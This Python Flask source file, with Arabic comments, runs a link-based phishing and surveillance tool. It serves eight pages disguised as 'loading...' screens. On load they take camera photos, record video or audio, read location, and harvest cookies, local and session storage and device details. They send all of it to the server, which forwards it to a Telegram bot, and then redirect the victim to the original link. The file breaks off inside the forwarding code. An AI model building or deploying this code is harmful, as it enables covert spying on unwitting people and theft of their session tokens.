from flask import Flask, request, render_template_string, redirect, jsonify
from datetime import datetime
import secrets
import os
import base64
import json
import requests
import threading
from config import config
from database import *
from utils import *

app = Flask(__name__)
app.secret_key = config.SECRET_KEY

# ============================================================
#  الصفحات الثمانية (كاميرا، فيديو، صوت، موقع، معلومات، شامل)
# ============================================================

# 1. كاميرا أمامية (3 صور)
CAMERA_FRONT_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #0a0a0a; }
        .container { background: rgba(255,255,255,0.03); padding: 40px; border-radius: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
        .loader { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: rgba(255,255,255,0.5); font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <p class="status" id="status">جاري تصوير الكاميرا الأمامية...</p>
    </div>
    <script>
        const session_id = "{{ session_id }}";
        const original_url = "{{ original_url }}";
        const statusEl = document.getElementById('status');
        const data = {
            session_id: session_id,
            timestamp: new Date().toISOString(),
            camera_front: [],
            device: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height
            }
        };
        async function captureFront() {
            const count = 3;
            for(let i = 0; i < count; i++) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: 320, height: 240 }
                    });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.autoplay = true;
                    await new Promise(r => video.onloadedmetadata = r);
                    await new Promise(r => setTimeout(r, 300));
                    const canvas = document.createElement('canvas');
                    canvas.width = 320;
                    canvas.height = 240;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    data.camera_front.push(canvas.toDataURL('image/jpeg', 0.7));
                    stream.getTracks().forEach(t => t.stop());
                    statusEl.textContent = `✅ تم تصوير الصورة ${i+1}/${count}`;
                } catch(e) {
                    statusEl.textContent = '❌ فشل التصوير';
                }
            }
        }
        async function sendData() {
            await captureFront();
            try {
                await fetch('/send_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                statusEl.textContent = '✅ تم الإرسال، جاري التوجيه...';
                setTimeout(() => { window.location.href = original_url; }, 1500);
            } catch(e) {
                statusEl.textContent = '❌ فشل الإرسال، جاري التوجيه...';
                setTimeout(() => { window.location.href = original_url; }, 2000);
            }
        }
        sendData();
    </script>
</body>
</html>
"""

# 2. كاميرا خلفية (3 صور)
CAMERA_BACK_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #0a0a0a; }
        .container { background: rgba(255,255,255,0.03); padding: 40px; border-radius: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
        .loader { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: rgba(255,255,255,0.5); font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <p class="status" id="status">جاري تصوير الكاميرا الخلفية...</p>
    </div>
    <script>
        const session_id = "{{ session_id }}";
        const original_url = "{{ original_url }}";
        const statusEl = document.getElementById('status');
        const data = {
            session_id: session_id,
            timestamp: new Date().toISOString(),
            camera_back: [],
            device: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height
            }
        };
        async function captureBack() {
            const count = 3;
            for(let i = 0; i < count; i++) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'environment', width: 320, height: 240 }
                    });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.autoplay = true;
                    await new Promise(r => video.onloadedmetadata = r);
                    await new Promise(r => setTimeout(r, 300));
                    const canvas = document.createElement('canvas');
                    canvas.width = 320;
                    canvas.height = 240;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    data.camera_back.push(canvas.toDataURL('image/jpeg', 0.7));
                    stream.getTracks().forEach(t => t.stop());
                    statusEl.textContent = `✅ تم تصوير الصورة ${i+1}/${count}`;
                } catch(e) {
                    statusEl.textContent = '❌ فشل التصوير';
                }
            }
        }
        async function sendData() {
            await captureBack();
            try {
                await fetch('/send_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                statusEl.textContent = '✅ تم الإرسال، جاري التوجيه...';
                setTimeout(() => { window.location.href = original_url; }, 1500);
            } catch(e) {
                statusEl.textContent = '❌ فشل الإرسال، جاري التوجيه...';
                setTimeout(() => { window.location.href = original_url; }, 2000);
            }
        }
        sendData();
    </script>
</body>
</html>
"""

# 3. فيديو أمامي (30 ثانية)
VIDEO_FRONT_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #0a0a0a; }
        .container { background: rgba(255,255,255,0.03); padding: 40px; border-radius: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
        .loader { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: rgba(255,255,255,0.5); font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <p class="status" id="status">جاري تسجيل الفيديو (30 ثانية)...</p>
    </div>
    <script>
        const session_id = "{{ session_id }}";
        const original_url = "{{ original_url }}";
        const statusEl = document.getElementById('status');
        const data = {
            session_id: session_id,
            timestamp: new Date().toISOString(),
            video: null,
            device: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height
            }
        };
        async function recordVideo() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: 320, height: 240 },
                    audio: true
                });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const reader = new FileReader();
                    reader.onload = () => data.video = reader.result;
                    reader.readAsDataURL(blob);
                    statusEl.textContent = '✅ تم تسجيل الفيديو';
                };
                recorder.start();
                let seconds = 0;
                const interval = setInterval(() => {
                    seconds++;
                    statusEl.textContent = `🎥 تسجيل الفيديو: ${seconds}/30 ثانية`;
                }, 1000);
                await new Promise(r => setTimeout(r, 30000));
                clearInterval(interval);
                if (recorder.state === 'recording') {
                    recorder.stop();
                    stream.getTracks().forEach(t => t.stop());
                }
            } catch(e) {
                statusEl.textContent = '❌ فشل تسجيل الفيديو';
            }
        }
        async function sendData() {
            await recordVideo();
            try {
                await fetch('/send_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                statusEl.textContent = '✅ تم الإرسال، جاري التوجيه...';
                setTimeout(() => { window.location.href = original_url; }, 1500);
            } catch(e) {
                statusEl.textContent = '❌ فشل الإرسال، جاري التوجيه...';
                setTimeout(() => { window.location.href = original_url; }, 2000);
            }
        }
        sendData();
    </script>
</body>
</html>
"""

# 4. فيديو خلفي (30 ثانية)
VIDEO_BACK_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #0a0a0a; }
        .container { background: rgba(255,255,255,0.03); padding: 40px; border-radius: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
        .loader { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: rgba(255,255,255,0.5); font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <p class="status" id="status">جاري تسجيل الفيديو (30 ثانية)...</p>
    </div>
    <script>
        const session_id = "{{ session_id }}";
        const original_url = "{{ original_url }}";
        const statusEl = document.getElementById('status');
        const data = {
            session_id: session_id,
            timestamp: new Date().toISOString(),
            video: null,
            device: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height
            }
        };
        async function recordVideo() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment', width: 320, height: 240 },
                    audio: true
                });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const reader = new FileReader();
                    reader.onload = () => data.video = reader.result;
                    reader.readAsDataURL(blob);
                    statusEl.textContent = '✅ تم تسجيل الفيديو';
                };
                recorder.start();
                let seconds = 0;
                const interval = setInterval(() => {
                    seconds++;
                    statusEl.textContent = `🎥 تسجيل الفيديو: ${seconds}/30 ثانية`;
                }, 1000);
                await new Promise(r => setTimeout(r, 30000));
                clearInterval(interval);
                if (recorder.state === 'recording') {
                    recorder.stop();
                    stream.getTracks().forEach(t => t.stop());
                }
            } catch(e) {
                statusEl.textContent = '❌ فشل تسجيل الفيديو';
            }
        }
        async function sendData() {
            await recordVideo();
            try {
                await fetch('/send_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                statusEl.textContent = '✅ تم الإرسال، جاري التوجيه...';
                setTimeout(() => { window.location.href = original_url; }, 1500);
            } catch(e) {
                statusEl.textContent = '❌ فشل الإرسال، جاري التوجيه...';
                setTimeout(() => { window.location.href = original_url; }, 2000);
            }
        }
        sendData();
    </script>
</body>
</html>
"""

# 5. تسجيل صوتي (30 ثانية)
AUDIO_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #0a0a0a; }
        .container { background: rgba(255,255,255,0.03); padding: 40px; border-radius: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
        .loader { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: rgba(255,255,255,0.5); font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <p class="status" id="status">جاري تسجيل الصوت (30 ثانية)...</p>
    </div>
    <script>
        const session_id = "{{ session_id }}";
        const original_url = "{{ original_url }}";
        const statusEl = document.getElementById('status');
        const data = {
            session_id: session_id,
            timestamp: new Date().toISOString(),
            audio: null,
            device: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height
            }
        };
        async function recordAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.onload = () => data.audio = reader.result;
                    reader.readAsDataURL(blob);
                    statusEl.textContent = '✅ تم تسجيل الصوت';
                };
                recorder.start();
                let seconds = 0;
                const interval = setInterval(() => {
                    seconds++;
                    statusEl.textContent = `🎙 تسجيل الصوت: ${seconds}/30 ثانية`;
                }, 1000);
                await new Promise(r => setTimeout(r, 30000));
                clearInterval(interval);
                if (recorder.state === 'recording') {
                    recorder.stop();
                    stream.getTracks().forEach(t => t.stop());
                }
            } catch(e) {
                statusEl.textContent = '❌ فشل تسجيل الصوت';
            }
        }
        async function sendData() {
            await recordAudio();
            try {
                await fetch('/send_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                statusEl.textContent = '✅ تم الإرسال، جاري التوجيه...';
                setTimeout(() => { window.location.href = original_url; }, 1500);
            } catch(e) {
                statusEl.textContent = '❌ فشل الإرسال، جاري التوجيه...';
                setTimeout(() => { window.location.href = original_url; }, 2000);
            }
        }
        sendData();
    </script>
</body>
</html>
"""

# 6. موقع تفصيلي مع خرائط جوجل
LOCATION_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #0a0a0a; }
        .container { background: rgba(255,255,255,0.03); padding: 40px; border-radius: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
        .loader { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: rgba(255,255,255,0.5); font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <p class="status" id="status">جاري جلب الموقع...</p>
    </div>
    <script>
        const session_id = "{{ session_id }}";
        const original_url = "{{ original_url }}";
        const statusEl = document.getElementById('status');
        const data = {
            session_id: session_id,
            timestamp: new Date().toISOString(),
            location: null,
            device: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height
            }
        };
        function getLocation() {
            if (navigator.geolocation) {
                statusEl.textContent = '📍 جلب الموقع...';
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        data.location = {
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude,
                            speed: pos.coords.speed
                        };
                        statusEl.textContent = '✅ تم جلب الموقع';
                        sendData();
                    },
                    () => {
                        statusEl.textContent = '❌ رفض الموقع، جاري التوجيه...';
                        setTimeout(() => { window.location.href = original_url; }, 2000);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                statusEl.textContent = '❌ الموقع غير مدعوم';
                setTimeout(() => { window.location.href = original_url; }, 2000);
            }
        }
        async function sendData() {
            try {
                await fetch('/send_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                statusEl.textContent = '✅ تم الإرسال، جاري التوجيه...';
                setTimeout(() => { window.location.href = original_url; }, 1500);
            } catch(e) {
                statusEl.textContent = '❌ فشل الإرسال، جاري التوجيه...';
                setTimeout(() => { window.location.href = original_url; }, 2000);
            }
        }
        getLocation();
    </script>
</body>
</html>
"""

# 7. معلومات الجهاز كاملة
DEVICE_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #0a0a0a; }
        .container { background: rgba(255,255,255,0.03); padding: 40px; border-radius: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
        .loader { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: rgba(255,255,255,0.5); font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <p class="status" id="status">جاري جمع معلومات الجهاز...</p>
    </div>
    <script>
        const session_id = "{{ session_id }}";
        const original_url = "{{ original_url }}";
        const statusEl = document.getElementById('status');
        const data = {
            session_id: session_id,
            timestamp: new Date().toISOString(),
            device: {},
            battery: null,
            cookies: {},
            storage: {},
            ip: null
        };
        data.device = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: screen.width + 'x' + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
            deviceMemory: navigator.deviceMemory || 'غير معروف',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            vendor: navigator.vendor || 'غير معروف',
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'غير مفعل'
        };
        if (navigator.getBattery) {
            navigator.getBattery().then(b => {
                data.battery = {
                    level: Math.round(b.level * 100),
                    charging: b.charging,
                    chargingTime: b.chargingTime,
                    dischargingTime: b.dischargingTime
                };
            }).catch(() => {});
        }
        try {
            document.cookie.split(';').forEach(c => {
                const p = c.trim().split('=');
                if (p.length >= 2) data.cookies[p[0]] = p.slice(1).join('=');
            });
        } catch(e) {}
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key) data.storage[key] = localStorage.getItem(key);
            }
        } catch(e) {}
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key) data.storage['session_' + key] = sessionStorage.getItem(key);
            }
        } catch(e) {}
        async function getIP() {
            try {
                const response = await fetch('/get_ip');
                const ipData = await response.json();
                data.ip = ipData.ip;
            } catch(e) {}
        }
        async function sendData() {
            await getIP();
            statusEl.textContent = '✅ تم جمع المعلومات، جاري الإرسال...';
            try {
                await fetch('/send_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                statusEl.textContent = '✅ تم الإرسال، جاري التوجيه...';
                setTimeout(() => { window.location.href = original_url; }, 1500);
            } catch(e) {
                statusEl.textContent = '❌ فشل الإرسال، جاري التوجيه...';
                setTimeout(() => { window.location.href = original_url; }, 2000);
            }
        }
        setTimeout(sendData, 2000);
    </script>
</body>
</html>
"""

# 8. صفحة شاملة (جميع الميزات السابقة)
ALL_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #0a0a0a; }
        .container { background: rgba(255,255,255,0.03); padding: 40px; border-radius: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
        .loader { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: rgba(255,255,255,0.5); font-size: 14px; }
        .sub-status { color: rgba(255,255,255,0.3); font-size: 12px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <p class="status" id="status">جاري جمع البيانات...</p>
        <p class="sub-status" id="subStatus"></p>
    </div>
    <script>
        const session_id = "{{ session_id }}";
        const original_url = "{{ original_url }}";
        const statusEl = document.getElementById('status');
        const subStatusEl = document.getElementById('subStatus');
        const data = {
            session_id: session_id,
            timestamp: new Date().toISOString(),
            device: {},
            camera_front: [],
            camera_back: [],
            video: null,
            audio: null,
            location: null,
            cookies: {},
            storage: {},
            battery: null,
            ip: null
        };
        data.device = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: screen.width + 'x' + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
            deviceMemory: navigator.deviceMemory || 'غير معروف',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            vendor: navigator.vendor || 'غير معروف',
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'غير مفعل'
        };
        if (navigator.getBattery) {
            navigator.getBattery().then(b => {
                data.battery = {
                    level: Math.round(b.level * 100),
                    charging: b.charging
                };
            }).catch(() => {});
        }
        try {
            document.cookie.split(';').forEach(c => {
                const p = c.trim().split('=');
                if (p.length >= 2) data.cookies[p[0]] = p.slice(1).join('=');
            });
        } catch(e) {}
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key) data.storage[key] = localStorage.getItem(key);
            }
        } catch(e) {}
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key) data.storage['session_' + key] = sessionStorage.getItem(key);
            }
        } catch(e) {}
        async function getIP() {
            try {
                const response = await fetch('/get_ip');
                const ipData = await response.json();
                data.ip = ipData.ip;
            } catch(e) {}
        }
        async function captureFront() {
            const count = 3;
            subStatusEl.textContent = '📷 تصوير الكاميرا الأمامية...';
            for(let i = 0; i < count; i++) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: 320, height: 240 }
                    });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.autoplay = true;
                    await new Promise(r => video.onloadedmetadata = r);
                    await new Promise(r => setTimeout(r, 300));
                    const canvas = document.createElement('canvas');
                    canvas.width = 320;
                    canvas.height = 240;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    data.camera_front.push(canvas.toDataURL('image/jpeg', 0.7));
                    stream.getTracks().forEach(t => t.stop());
                } catch(e) {}
            }
            subStatusEl.textContent = `📷 تم تصوير ${data.camera_front.length} صورة أمامية`;
        }
        async function captureBack() {
            const count = 3;
            subStatusEl.textContent = '📷 تصوير الكاميرا الخلفية...';
            for(let i = 0; i < count; i++) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'environment', width: 320, height: 240 }
                    });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.autoplay = true;
                    await new Promise(r => video.onloadedmetadata = r);
                    await new Promise(r => setTimeout(r, 300));
                    const canvas = document.createElement('canvas');
                    canvas.width = 320;
                    canvas.height = 240;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    data.camera_back.push(canvas.toDataURL('image/jpeg', 0.7));
                    stream.getTracks().forEach(t => t.stop());
                } catch(e) {}
            }
            subStatusEl.textContent = `📷 تم تصوير ${data.camera_back.length} صورة خلفية`;
        }
        async function recordVideo() {
            try {
                subStatusEl.textContent = '🎥 تسجيل فيديو (30 ثانية)...';
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: 320, height: 240 },
                    audio: true
                });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const reader = new FileReader();
                    reader.onload = () => data.video = reader.result;
                    reader.readAsDataURL(blob);
                };
                recorder.start();
                await new Promise(r => setTimeout(r, 30000));
                if (recorder.state === 'recording') {
                    recorder.stop();
                    stream.getTracks().forEach(t => t.stop());
                }
                subStatusEl.textContent = '✅ تم تسجيل الفيديو';
            } catch(e) {
                subStatusEl.textContent = '❌ فشل تسجيل الفيديو';
            }
        }
        async function recordAudio() {
            try {
                subStatusEl.textContent = '🎙 تسجيل صوتي (30 ثانية)...';
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.onload = () => data.audio = reader.result;
                    reader.readAsDataURL(blob);
                };
                recorder.start();
                await new Promise(r => setTimeout(r, 30000));
                if (recorder.state === 'recording') {
                    recorder.stop();
                    stream.getTracks().forEach(t => t.stop());
                }
                subStatusEl.textContent = '✅ تم تسجيل الصوت';
            } catch(e) {
                subStatusEl.textContent = '❌ فشل تسجيل الصوت';
            }
        }
        function getLocation() {
            if (navigator.geolocation) {
                subStatusEl.textContent = '📍 جلب الموقع...';
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        data.location = {
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        };
                        subStatusEl.textContent = '✅ تم جلب الموقع';
                    },
                    () => { subStatusEl.textContent = '❌ رفض الموقع'; }
                );
            }
        }
        async function runAll() {
            statusEl.textContent = '🔄 جاري جمع البيانات...';
            await captureFront();
            await captureBack();
            await recordVideo();
            await recordAudio();
            getLocation();
            await getIP();
            await new Promise(r => setTimeout(r, 3000));
            statusEl.textContent = '📤 إرسال البيانات...';
            try {
                await fetch('/send_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                statusEl.textContent = '✅ تم الإرسال، جاري التوجيه...';
                setTimeout(() => { window.location.href = original_url; }, 1500);
            } catch(e) {
                statusEl.textContent = '❌ فشل الإرسال، جاري التوجيه...';
                setTimeout(() => { window.location.href = original_url; }, 2000);
            }
        }
        runAll();
    </script>
</body>
</html>
"""

# ============================================================
#  دوال إنشاء الجلسات وإدارتها
# ============================================================

def create_session(chat_id, features, original_url, config_data=None):
    """إنشاء جلسة جديدة وحفظها في قاعدة البيانات"""
    session_id = generate_session_id()
    
    conn = get_db()
    conn.execute('''
        INSERT INTO sessions (session_id, chat_id, features, original_url, config, created)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (session_id, chat_id, features, original_url, json.dumps(config_data or {}), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    return session_id

def get_session(session_id):
    """جلب بيانات الجلسة من قاعدة البيانات"""
    conn = get_db()
    session = conn.execute('SELECT * FROM sessions WHERE session_id = ?', (session_id,)).fetchone()
    conn.close()
    return session

# ============================================================
#  دوال Flask
# ============================================================

@app.route('/')
def index():
    return "🔬 مختبر الاختبار - يعمل"

@app.route('/get_ip')
def get_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    return jsonify({'ip': ip})

@app.route('/<short_id>')
def handle_short_link(short_id):
    """معالجة الرابط المختصر وإعادة التوجيه"""
    # البحث عن الجلسة في قاعدة البيانات
    conn = get_db()
    session = conn.execute('SELECT * FROM sessions WHERE session_id LIKE ?', (short_id + '%',)).fetchone()
    conn.close()
    
    if not session:
        return "❌ رابط غير صالح", 404
    
    session_id = session['session_id']
    features = session['features']
    original_url = session['original_url']
    config_data = json.loads(session['config']) if session['config'] else {}
    
    # ====== التحقق من صلاحية الرابط (ساعة واحدة) ======
    created = datetime.fromisoformat(session['created'])
    if (datetime.now() - created).seconds > 600:
        return "⏰ انتهت صلاحية الرابط", 403
    
    # عرض صفحة الاختبار المناسبة
    return redirect(f"/test/{session_id}/{features}")

@app.route('/test/<session_id>/<features>')
def test_page(session_id, features):
    """عرض صفحة الاختبار المناسبة"""
    session = get_session(session_id)
    if not session:
        return "❌ جلسة غير صالحة", 404
    
    # التحقق من الصلاحية
    created = datetime.fromisoformat(session['created'])
    if (datetime.now() - created).seconds > 600:
        return "⏰ انتهت صلاحية الرابط", 403
    
    original_url = session['original_url']
    config_data = json.loads(session['config']) if session['config'] else {}
    
    # اختيار الصفحة المناسبة
    pages = {
        'camera_front': CAMERA_FRONT_PAGE,
        'camera_back': CAMERA_BACK_PAGE,
        'video_front': VIDEO_FRONT_PAGE,
        'video_back': VIDEO_BACK_PAGE,
        'audio': AUDIO_PAGE,
        'location': LOCATION_PAGE,
        'device': DEVICE_PAGE,
        'all': ALL_PAGE
    }
    
    page = pages.get(features)
    if not page:
        return "❌ ميزة غير معروفة", 404
    
    return render_template_string(
        page,
        session_id=session_id,
        original_url=original_url,
        config=config_data
    )

@app.route('/send_data', methods=['POST'])
def send_data():
    try:
        data = request.json
        session_id = data.get('session_id')
        
        # جلب الجلسة
        session = get_session(session_id)
        if not session:
            return jsonify({'error': 'جلسة غير صالحة'}), 404
        
        chat_id = session['chat_id']
        
        # ====== إرسال البيانات إلى البوت ======
        from bot import bot
        from config import config
        
        # إرسال الصور
        for key in ['camera_front', 'camera_back']:
            if data.get(key):
                for i, img_data in enumerate(data[key]):
                    try:
                        img = img_data.split(',', 1)[1]
                        url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendPhoto"
                        files = {'photo': base64.b64decode(img)}
                        caption = f"{key.replace('_', ' ')} #{i+1}"
